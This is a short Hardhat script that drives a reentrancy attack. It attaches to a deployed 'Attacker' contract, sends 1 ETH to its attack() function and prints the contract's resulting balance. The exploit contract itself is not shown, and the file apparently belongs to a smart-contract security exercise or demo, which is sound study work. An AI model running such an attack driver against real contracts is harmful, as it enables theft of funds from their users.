const hre = require("hardhat");

let account, attacker;

const attackerAddress = process.env.ATTACKER_ADDRESS;

async function main() {
	const provider = hre.ethers.provider;
	[account] = await hre.ethers.getSigners();

	const attackerFactory = await hre.ethers.getContractFactory("Attacker");

	attacker = attackerFactory.attach(attackerAddress);

	const value = hre.ethers.parseEther("1");
	console.log("Attempting reentrancy attack...");
	await attacker.attack({ value: value });
	console.log("Done");
	console.log(
		"Attacker contract balance: ",
		hre.ethers.formatEther(await provider.getBalance(attacker)),
		"ETH"
	);
}

main()
	.then(() => process.exit(0))
	.catch((error) => {
		console.error(error);
		process.exit(1);
	});
